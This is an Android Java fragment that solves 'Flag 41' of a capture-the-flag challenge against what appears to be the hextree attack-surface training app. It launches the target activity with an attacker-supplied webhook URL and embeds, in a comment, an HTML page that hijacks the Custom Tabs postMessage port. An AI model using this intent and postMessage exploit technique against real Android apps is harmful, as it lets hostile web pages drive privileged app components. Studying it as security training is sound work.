package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.fragment.app.Fragment;

public class Flag41Fragment extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag41, container, false);
        
        EditText editText = view.findViewById(R.id.editTextFlag41);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag41);
        
        launchButton.setOnClickListener(v -> {
            String URL = editText.getText().toString();
            if (URL.isEmpty()) {
                Toast.makeText(getContext(), "Please enter Webhook URL", Toast.LENGTH_SHORT).show();
                return;
            }
            // HTML page to send the postMessage:
            /*
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Custom Tabs PostMessage Test</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        #message-container {
            border: 1px solid #888;
            padding: 10px;
            margin-top: 20px;
            height: 300px;
            overflow-y: auto;
            background: #1e1e1e;
        }
        button {
            background-color: #4CAF50;
            border: none;
            padding: 10px 20px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <h1>Custom Tabs Message Tester</h1>
    <button id="send-message">Send Test Message</button>
    <div id="message-container"></div>

    <script>
        let ports = [];
        let portCount = 0;
        const messageContainer = document.getElementById("message-container");
        const sendMessageButton = document.getElementById("send-message");

        window.addEventListener("message", function (event) {
            if (!event.ports || event.ports.length === 0) return;
            const port = event.ports[0];
            if (ports.includes(port)) return;

            ports.push(port);
            const portIndex = portCount++;

            function postMessageToApp(msg) {
                const msgDiv = document.createElement("div");
                msgDiv.textContent = `[web] ${msg}`;
                messageContainer.appendChild(msgDiv);
                port.postMessage(msg);
            }

            port.onmessage = function(event) {
                const msgDiv = document.createElement("div");
                try {
                    msgDiv.textContent = `[app] ${JSON.stringify(JSON.parse(event.data), null, 2)}`;
                } catch (e) {
                    msgDiv.textContent = `[app] ${event.data}`;
                }
                messageContainer.appendChild(msgDiv);
            };

            postMessageToApp(JSON.stringify({ message: "init_complete" }));
            setTimeout(() => postMessageToApp(JSON.stringify({ message: "success" })), 3000);
        });

        sendMessageButton.addEventListener("click", () => {
            window.postMessage({ message: "test" }, "*");
        });
    </script>
</body>
</html>
             */
            // Create an intent to launch Flag 41 exploit
            Intent intent = new Intent();
            intent.putExtra("URL", URL);
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag41Activity"));
            startActivity(intent);
        });

        return view;
    }
} 